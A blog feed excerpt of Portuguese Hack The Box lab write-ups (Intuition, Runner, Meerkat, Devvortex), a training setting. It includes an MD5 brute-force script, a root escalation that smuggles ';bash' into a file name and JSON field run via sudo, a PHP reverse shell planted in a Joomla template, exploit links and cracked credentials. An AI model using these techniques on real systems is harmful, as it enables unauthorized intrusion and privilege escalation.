+<p><img src="https://i.imgur.com/lyiQtWG.png" alt="" />
+<img src="https://i.imgur.com/0E6O9n6.png" alt="" /></p>
+
+<p>A página de PDF é sucetivel ao ataque SSRF. 
+<img src="https://i.imgur.com/08kHcm0.png" alt="" />
+<img src="https://i.imgur.com/G6wyUsb.png" alt="" />
+<img src="https://i.imgur.com/IU6WU3h.png" alt="" />
+<img src="https://i.imgur.com/OLSH9Hq.png" alt="" /></p>
+<h2 id="usuário">Usuário</h2>
+<p><img src="https://i.imgur.com/6xzYnAw.png" alt="" />
+Para descobrir em qual usuário devemos logar no ssh, usaremos o seguinte comando:
+<img src="https://i.imgur.com/O6WSzJV.png" alt="" /></p>
+
+<h2 id="root">Root</h2>
+
+<p>Database usando SQLite.</p>
+
+<p><img src="https://i.imgur.com/9lzyed9.png" alt="" /></p>
+
+<p>Apenas consegui quebrar a senha do Adam.</p>
+
+<p><img src="https://i.imgur.com/arQt2bZ.png" alt="" /></p>
+
+<p>Faça o login do FTP e faça o download dos seguintes arquivos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp adam@127.0.0.1
+
+get runner1
+
+get runner1.c
+
+get run-tests.sh
+</code></pre></div></div>
+
+<p>Com esses arquivos, é possível encontrar a AUTH_KEY_PREFIX e KNOWN_MD5_HASH. Com um script simples é possível o código de autorização.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import hashlib
+import itertools
+import string
+
+AUTH_KEY_PREFIX = "UHI75GHI"
+KNOWN_MD5_HASH = "0feda17076d793c2ef2870d7427ad4ed"
+CHARSET = string.ascii_letters + string.digits
+KEY_LENGTH = 4
+
+def check_auth_key(suffix):
+    key = f"{AUTH_KEY_PREFIX}{suffix}"
+    return hashlib.md5(key.encode()).hexdigest() == KNOWN_MD5_HASH
+
+for guess in itertools.product(CHARSET, repeat=KEY_LENGTH):
+    if check_auth_key(''.join(guess)):
+        print(f"Found auth key: {AUTH_KEY_PREFIX}{''.join(guess)}")
+        break
+else:
+    print("Auth key not found.")
+
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(yoshiro㉿kali)-[~/htb]
+└─$ python3 auth.py                                 
+Found auth key: UHI75GHINKOP
+</code></pre></div></div>
+
+<p>Adam não tem as permissões necessárias para as executar ações relacionadas ao sys-admin, por isso, será necessário escolonar para o usuário Lopez.</p>
+
+<p>Procurando no log, foi possível encontrar a pasta suricata. Utilizando o grep é possível identificar o login do Lopez.</p>
+
+<p><img src="https://i.imgur.com/NzwdWmV.png" alt="" /></p>
+
+<p>Com acesso a esse usuário, é possível acessar o runner2.
+<img src="https://i.imgur.com/cluIOti.png" alt="" /></p>
+
+<p>Com algumas tentativas é erros, é possível identificar o comando que precisa ter utilizado.
+<img src="https://i.imgur.com/tgRJEfE.png" alt="" /></p>
+
+<p>Para o acesso root, faça um download de algum sys-admin com meta/main.yml, por exemplo: https://github.com/coopdevs/sys-admins-role/archive/v0.0.3.tar.gz.</p>
+
+<p>Após isso:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -O http://10.10.14.42:8080/sys-admins-role-0.0.3.tar.gz
+
+mv sys-admins-role-0.0.3.tar.gz sys-admins-role.tar\;bash
+
+echo '{"run": { "action": "install","role_file":"sys-admins-role.tar;bash"}, "auth_code": "UHI75GHINKOP"}' &gt; yoshi.json
+
+sudo /opt/runner2/runner2 yoshi.json
+</code></pre></div></div>
+
+<p>Você é root.</p>]]></content><author><name>Kaio Barbosa</name><email>kaioedu388@gmail.com</email></author><category term="HTB" /><category term="Máquinas" /><category term="máquinas" /><category term="htb" /><summary type="html"><![CDATA[Intuition]]></summary></entry><entry><title type="html">HTB Máquinas - Runner</title><link href="http://localhost:4000/htb/m%C3%A1quinas/HTB-Runner/" rel="alternate" type="text/html" title="HTB Máquinas - Runner" /><published>2024-04-23T07:30:12-03:00</published><updated>2024-04-23T07:30:12-03:00</updated><id>http://localhost:4000/htb/m%C3%A1quinas/HTB-Runner</id><content type="html" xml:base="http://localhost:4000/htb/m%C3%A1quinas/HTB-Runner/"><![CDATA[<h1 id="runner">Runner</h1>
+
+<h2 id="enumeração">Enumeração</h2>
+<p>Nmap:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──(yoshiro㉿kali)-[~/htb/runner]
+└─$ nmap 10.10.11.13 -A -sV -sC
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 13:48 -03
+Nmap scan report for runner.htb (10.10.11.13)
+Host is up (0.34s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp   open  http        nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Runner - CI/CD Specialists
+8000/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 74.03 seconds
+</code></pre></div></div>
+
+<p>Jogando o IP no navegador, somos direcionados para um site que apresenta desenvolvedores especialiados em CI/CD. 
+<img src="https://i.imgur.com/1TN6qyp.png" alt="" /></p>
+
+<p>Esse site em sí, não oferece oportunidades para um ataque, então procurei por subdomínios. Utilizei uma wordlist própria em que contém palavras chaves relacionadas ao desenvolvimento CI/CD e, junto com o vhost, foi possível encontrar o dominio <em>teamcity.runner.htb</em>.</p>
+
+<p>Abaixo do login, é possível identificar a versão do TeamCity, sendo a  Version 2023.05.3 (build 129390). Pesquisando sobre, essa versão é vulneránel ao <a href="https://www.exploit-db.com/exploits/51884">CVE-2023-42793</a>.</p>
+
+<h2 id="explorando-a-vulnerabilidade">Explorando a vulnerabilidade</h2>
+
+<p>Utilizando o script, é possível gerar um login para acesso a plataforma.
+<img src="https://i.imgur.com/r884cYc.png" alt="" /></p>
+
+<p>Após acessar, é possível identificar que a plataforma possuí backups, e nesses backups, é possível identificar uma chave de acesso.
+<img src="https://i.imgur.com/cSNeD5z.png" alt="" />
+<img src="https://i.imgur.com/pMtNPJx.png" alt="" /></p>
+
+<p>Também é possível identificar alguns usuários na plataforma do TeamCity, levando a considerar que a chave de acesso é referente ao usuário matthew ou John.
+<img src="https://i.imgur.com/bpX6Orx.png" alt="" /></p>
+
+<h2 id="user-flag">User Flag</h2>
+
+<p>Consegui acesso ao usuário John pelo SSh e consegui a flag user.
+<img src="https://i.imgur.com/WTQZLMd.png" alt="" /></p>
+
+<p>Verificando mais afundo, é possível identificar que existe outro domínio sobre o sistema, o <em>portainer-administration.runner.htb</em>.
+<img src="https://i.imgur.com/uBNHBYw.png" alt="" /></p>
+
+<p>Procurando por mais informações nos arquivos de backup, é possível encontrar informações sobre as senhas criptografadas dos usuários do sistema.
+<img src="https://i.imgur.com/ao1cCQw.png" alt="" /></p>
+
+<p>Utilizando o hashcat, é possível descriptografar a senha do matthew.
+<img src="https://i.imgur.com/l8aT3a1.png" alt="" /></p>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>Utilizando as credenciais do matthew, é possível acessar a plataforma de dockers do runners.htb.
+<img src="https://i.imgur.com/rTLvYp1.png" alt="" /></p>
+
+<p>Vamos criar um container para que seja possível realizar comandos via command bash. Primeiramente, criaremos um volume com as seguinte configurações:
+<img src="https://i.imgur.com/WWo1Ccy.png" alt="" /></p>
+
+<p>Depois, iremos criar um container com as seguintes configurações:
+<img src="https://i.imgur.com/MgrMdAJ.png" alt="" />
+<img src="https://i.imgur.com/JCekQwo.png" alt="" />
+<img src="https://i.imgur.com/l5038j4.png" alt="" /></p>
+
+<p>Depois disso, iremos iniciar o container e iniciar um command bash e conseguir o acesso root.
+<img src="https://i.imgur.com/Iibz6lN.png" alt="" /></p>]]></content><author><name>Kaio Barbosa</name><email>kaioedu388@gmail.com</email></author><category term="HTB" /><category term="Máquinas" /><category term="máquinas" /><category term="htb" /><summary type="html"><![CDATA[Runner]]></summary></entry><entry><title type="html">HTB Sherlocks - Meerkat</title><link href="http://localhost:4000/htb/sherlocks/HTB-Meerkat/" rel="alternate" type="text/html" title="HTB Sherlocks - Meerkat" /><published>2024-04-18T03:47:12-03:00</published><updated>2024-04-18T03:47:12-03:00</updated><id>http://localhost:4000/htb/sherlocks/HTB-Meerkat</id><content type="html" xml:base="http://localhost:4000/htb/sherlocks/HTB-Meerkat/"><![CDATA[<h1 id="meerkat">Meerkat</h1>
+
+<h2 id="task-1">Task 1</h2>
+<p><em>Acreditamos que o servidor da nossa Plataforma de Gestão Empresarial foi comprometido. Você pode confirmar o nome do aplicativo em execução?</em></p>
+
+<p>Antes de tudo, é possível observar que o host local é o 172.31.6.44 e que, está recebendo muito tráfego vindo dos IP’s 54.144.148.213, 156.146.62.213, 138.199.59.221 e 95.181.232.30.</p>
+
+<p>Aplicando um filtro de tcp para a porta 8080 e para o host local e foi possível perceber que o aplicativo em execução é o BonitaSoft por conta das solicitações GET e POST que foram apresentadas.</p>
+
+<p>R: BonitaSoft
+<img src="https://i.imgur.com/qTru7jF.png" alt="" /></p>
+
+<h2 id="task-2">Task 2</h2>
+<p><em>Acreditamos que o invasor pode ter usado um subconjunto da categoria de ataque de força bruta – qual é o nome do ataque realizado?</em></p>
+
+<p>Análisando as solicitações POST que foram realizadas no host, é possível perceber que o atacante está utilizando um método de força bruta baseado em injeção de credenciais.</p>
+
+<p>R: Credential Stuffing</p>
+
+<p><img src="https://i.imgur.com/xtNGrYp.png" alt="" /></p>
+
+<h2 id="task-3">Task 3</h2>
+<p><em>A vulnerabilidade explorada possui um CVE atribuído? Se sim, qual?</em></p>
+
+<p>Analisando o JSON é possível identificar que o atacante utilizou o CVE-2022-25237 para tentar conseguir acesso a aplicação com uma exploit provido do bonitasoft.</p>
+
+<p>R: CVE-2022-25237</p>
+
+<p><img src="https://i.imgur.com/wZxr9Vk.png" alt="" /></p>
+
+<h2 id="task-4">Task 4</h2>
+<p><em>Qual string foi anexada ao caminho do URL da API para ignorar o filtro de autorização da exploração do invasor?</em></p>
+
+<p>Lendo sobre a vulnerabilidadae <a href="https://rhinosecuritylabs.com/application-security/cve-2022-25237-bonitasoft-authorization-bypass/">CVE-2022-25237</a>, é possível identificar que ela funciona adicionando “i18ntranslation” em uma das duas variações da URL.</p>
+
+<p>R: i18ntranslation</p>
+
+<p><img src="https://rhinosecuritylabs.com/wp-content/uploads/2022/05/1.png" alt="" /></p>
+
+<h2 id="task-5">Task 5</h2>
+<p><em>Quantas combinações de nomes de usuário e senhas foram usadas no ataque de preenchimento de credenciais?</em></p>
+
+<p>Apliquei o filtro http.request.method == “POST” e analisei quantas requisições únicas foram feitas.</p>
+
+<p>R: 56</p>
+
+<p><img src="https://i.imgur.com/IgA2VIM.png" alt="" /></p>
+
+<h2 id="task-6">Task 6</h2>
+<p><em>Qual combinação de nome de usuário e senha foi bem-sucedida?</em>
+Análisando a última requisição do filtro aplicado anteriormente, foi possível identificar o usuário e senha.</p>
+
+<p>R: seb.broom@forela.co.uk:g0vernm3nt</p>
+
+<p><img src="https://i.imgur.com/itHdrlF.png" alt="" /></p>
+
+<h2 id="task-7">Task 7</h2>
+<p><em>Se houver, qual site de compartilhamento de texto o invasor utilizou?</em></p>
+
+<p>Análisando o pacote 3652 com o método GET, foi possível identificar que o atacante utilizou o pastes.io.</p>
+
+<p>R: pastes.io</p>
+
+<p><img src="https://i.imgur.com/3Kw5Fkc.png" alt="" /></p>
+
+<h2 id="task-8">Task 8</h2>
+<p><em>Forneça o nome do arquivo da chave pública usada pelo invasor para obter persistência em nosso host.</em></p>
+
+<p>Análisando o script em que o atacante fez o upload em https://pastebin.ai/raw/bx5gcr0et8, é possível identificar que o nome do arquivo é hffgra4unv.</p>
+
+<p>R: hffgra4unv</p>
+
+<p><img src="https://i.imgur.com/mQZAfIg.png" alt="" /></p>
+
+<h2 id="task-9">Task 9</h2>
+<p><em>Você pode confirmar o arquivo modificado pelo invasor para ganhar persistência?</em></p>
+
+<p>Análisandoo script Análisando o script em que o atacante fez o upload em https://pastebin.ai/raw/bx5gcr0et8, é possível identificar que o nome do arquivo modificado pelo atacante é /home/ubuntu/.ssh/authorized_keys.</p>
+
+<p>R: /home/ubuntu/.ssh/authorized_keys</p>
+
+<p><img src="https://i.imgur.com/mQZAfIg.png" alt="" /></p>
+
+<h2 id="task-10">Task 10</h2>
+<p><em>Você pode confirmar o ID da técnica MITRE deste tipo de mecanismo de persistência?</em></p>
+
+<p>Anaĺisando a Matrix do MITRE ATT&amp;CK, identifiquei um TTP que corresponde às ações do invasor: Chaves autorizadas SSH (T1098.004) em Manipulação de conta na coluna Persistência.</p>
+
+<p>R: T1098.004</p>
+
+<p><img src="https://i.imgur.com/GZt6qHu.png" alt="" /></p>]]></content><author><name>Kaio Barbosa</name><email>kaioedu388@gmail.com</email></author><category term="HTB" /><category term="Sherlocks" /><category term="sherlocks" /><category term="htb" /><summary type="html"><![CDATA[Meerkat]]></summary></entry><entry><title type="html">HTB Máquinas - Devvortex</title><link href="http://localhost:4000/htb/m%C3%A1quinas/HTB-Devvortex/" rel="alternate" type="text/html" title="HTB Máquinas - Devvortex" /><published>2024-04-11T09:33:12-03:00</published><updated>2024-04-11T09:33:12-03:00</updated><id>http://localhost:4000/htb/m%C3%A1quinas/HTB-Devvortex</id><content type="html" xml:base="http://localhost:4000/htb/m%C3%A1quinas/HTB-Devvortex/"><![CDATA[<h1 id="devvortex">Devvortex</h1>
+
+<h2 id="enumeração">Enumeração</h2>
+<p>Primeiramente, iremos iniciar com o NMAP que é uma ferramenta desenvolvida para realizar varreduras de portas e mapear dispositivos conectados a uma rede, o Nmap é uma poderosa utilidade de linha de comando que fornece informações detalhadas sobre hosts, serviços e sistemas operacionais em uma rede. Seus recursos incluem detecção de dispositivos, varredura de portas, identificação de serviços em execução, detecção de firewalls e análise de vulnerabilidades. Nessa situação, usei uma varredura simples para verificar quais portas estavam abertas.</p>
+
+<p><img src="https://i.imgur.com/Rcquds3.png" alt="" /></p>
+
+<p>Após a varredura é possível encontrar as portas 80 e 22 abertas.</p>
+
+<p>A porta 80 é geralmente reservada para comunicações HTTP, que é o protocolo usado para transferência de informações na internet.</p>
+
+<p>A porta 22 está associada ao protocolo SSH, que é utilizado para acessar e gerenciar remotamente sistemas Unix-like. O SSH fornece uma conexão segura e criptografada, sendo amplamente utilizado para administração remota de servidores. Por meio de uma conexão SSH, os usuários podem executar comandos no terminal de um sistema remoto de forma segura, transferir arquivos e realizar outras operações.</p>
+
+<p>Usando o endereço ip <code class="language-plaintext highlighter-rouge">10.10.11.242</code> somos direcionados para http://devvortex.htb. Um site bem estruturado e que possuí um forms de contato sem nenhuma aplicação útil.</p>
+
+<p><img src="https://i.imgur.com/F2MjClU.png" alt="" />
+<img src="https://i.imgur.com/IZZpusH.png" alt="" /></p>
+
+<p>Utilizei o gobuster nessa página, que é uma ferramenta utilizada para realizar ataques de força bruta em servidores web, buscando por recursos ocultos ou não autorizados. Seu principal propósito é ajudar na enumeração de diretórios e arquivos em um site, mas nesse caso, não foi encontrado nenhuma pista para qualquer avanço.</p>
+
+<p><img src="https://i.imgur.com/2pWJqLM.png" alt="" /></p>
+
+<p>Então decidi procurar por mais domínios atrelados ao <code class="language-plaintext highlighter-rouge">devvortex.htb</code> usando o dnsmap. Ao realizar consultas ao DNS, o DNSMap tenta encontrar subdomínios que podem representar possíveis pontos de entrada para ataques ou fornecer informações valiosas sobre a infraestrutura de um alvo.</p>
+
+<p><img src="https://i.imgur.com/kNgguFG.png" alt="" /></p>
+
+<p>Encontrei outro domínio sendo o http://dev.devvortex.htb.</p>
+
+<p><img src="https://i.imgur.com/4GSKyQw.png" alt="" /></p>
+
+<p>Utilizando o gobuster nessa página foi possível encontrar uma página de administrador.</p>
+
+<p><img src="https://i.imgur.com/atQGy9J.png" alt="" /></p>
+
+<p>Indo até http://dev.devvortex.htb/administrator/ foi possível encontrar página de login do “Joomla!”.</p>
+
+<p><img src="https://i.imgur.com/Y1UIobh.png" alt="" /></p>
+
+<p>O Joomla é usado como CMS, ele ajuda principalmente para gestão de conteúdo de páginas oferecendo ferramentas para criar, publicar e gerir conteúdos online. Vamos verificar qual versão está sendo rodada usando o JoomScan para procurar por vulnerabilidades.</p>
+
+<p><img src="https://i.imgur.com/0cMo2No.png" alt="" /></p>
+
+<p><img src="https://i.imgur.com/SpbK97M.png" alt="" /></p>
+
+<p>Descobrimos então, que a versão que o Devvortex está rodando é a 4.2.6.</p>
+
+<h2 id="explorando-a-vulnerabilidade">Explorando a vulnerabilidade</h2>
+
+<p>Pesquisando, encontrei a vulnerabilidade CVE-2023-23752, um exploit que explora versões abaixo da 4.2.8. Então, provavelmente, esse sistema será afetado por esse exploit.</p>
+
+<p>O exploit está disponível em:https://github.com/Acceis/exploit-CVE-2023-23752</p>
+
+<p>Mais informações em: https://nvd.nist.gov/vuln/detail/CVE-2023-23752</p>
+
+<p>Utilizando o exploit, conseguimos informações de login no sistema. E com essas informações, conseguimos adentrar no Joomla.</p>
+
+<p><img src="https://i.imgur.com/7SXXdkQ.jpg" alt="" />
+<img src="https://i.imgur.com/W4rTCq5.png" alt="" /></p>
+
+<p>Dentro do sistema, conseguimos o direito de edição dos templates. Seguindo o caminho System &gt; Templates &gt; Administrator Templates, encontrei algumas páginas php disponíveis dentro de um template.</p>
+
+<p>Implementei um código para que, assim que essa página fosse chamada pelo navegador, a linha seria lida e um shell reverso feito.</p>
+
+<p><img src="https://i.imgur.com/aaorM0m.png" alt="" /></p>
+
+<p>O netcat é uma ferramenta utilizada para interação de rede, oferecendo funcionalidades versáteis de leitura e escrita de dados em sockets. O Netcat é muitas vezes referido como a “canivete suíço para TCP/IP” devido à sua flexibilidade e capacidade de desempenhar diversas funções e iremos utilizar dessa ferramenta para realizar um shell reverso.</p>
+
+<p>Assim que eu visitei http://dev.devvortex.htb/administrator/templates/atum/login.php, o meu netcat foi ativado, conseguindo assim acesso ao shell.</p>
+
+<p><img src="https://i.imgur.com/Xpkxkgj.png" alt="" /></p>
+
+<h2 id="escalonando-para-usuário">Escalonando para usuário</h2>
+
+<p>Verificando o sistema de dentro, foi póssivel identificar o usuário logan novamente, pois antes haviamos encontrado ele no scan em que fizemos utilizando o JoomScan. E como ele está registrado no Joomla, é bem provável que a sua senha esteja no banco de dados do sistema.</p>
+
+<p><img src="https://i.imgur.com/Jb46ahV.png" alt="" /></p>
+
+<p>Antes de tentar acessar o banco de dados, é necessário iniciar um pseudo terminal de utilidades com python. É necessário pois precisamos iniciar uma interface para rodar os comandos do banco de dados.</p>
+
+<p><img src="https://i.imgur.com/BUsbqiF.jpg" alt="" /></p>
+
+<p>Pesquisando no banco de dados, é possível encontrar a tabela com os usuários do sistema, e abrindo ela, é possível identificar hashs de senhas. Vamos pegar a hash do usuário logan e quebrar utilizando o john the ripper para que possamos efetuar o login no ssh.</p>
+
+<p><img src="https://i.imgur.com/9zD4n4X.png" alt="" />
+<img src="https://i.imgur.com/yVj92vL.png" alt="" />
+<img src="https://i.imgur.com/Y7h5ejZ.png" alt="" /></p>
+
+<p>Após essas etapas, é possível acessar o ssh com a senha que foi quebrada e conseguir a userflag.</p>
+
+<p><img src="https://i.imgur.com/xIxHZtc.png" alt="" /></p>
+
+<h2 id="escalonando-para-root">Escalonando para root</h2>
+<p>Utilizei “sudo -l” para listar os privilégios de sudo que o usuário logan possuí. Identifiquei quais operações estão autorizadas para ele, assim, proporcionando uma visão clara dos privilégios disponíveis e possíveis brechas para escalonar o privilegio como root. Com acesso a essas informações, consegui detectar a versão disponível no apport-cli.</p>
+
+<p>O Apport é um sistema de coleta e relatório de erros que ajuda os desenvolvedores e mantenedores do sistema a identificar e corrigir problemas em aplicativos e componentes do sistema. Isso é útil quando um usuário encontra um problema ou falha em um aplicativo e deseja fornecer informações detalhadas sobre o erro para ajudar no processo de correção. O relatório pode incluir informações sobre o sistema, logs relevantes e outros detalhes que podem ser úteis para diagnosticar e corrigir o problema.</p>
+
+<p><img src="https://i.imgur.com/g6JOt0b.png" alt="" /></p>
+
+<p>Essa versão do apport-cli possível uma vulnerabilidade em que vamos carregar e visualizar os crash reports usando o apport-cli. O sistema linux possuí esses crash no /var/crash, utilizando o seguinte comando:</p>
+
+<p><img src="https://i.imgur.com/xoUVkf9.png" alt="" /></p>
+
+<p>Após começar a carregar, digite V e a página de crash irá carregar. Dessa forma, poderemos digitar !sh conseguindo acesso root e a flag root.</p>
+
+<p><img src="https://i.imgur.com/56qfrw0.png" alt="" />
+<img src="https://i.imgur.com/OyQZ8Vm.jpg" alt="" /></p>]]></content><author><name>Kaio Barbosa</name><email>kaioedu388@gmail.com</email></author><category term="HTB" /><category term="Máquinas" /><category term="máquinas" /><category term="htb" /><summary type="html"><![CDATA[Devvortex]]></summary></entry></feed>
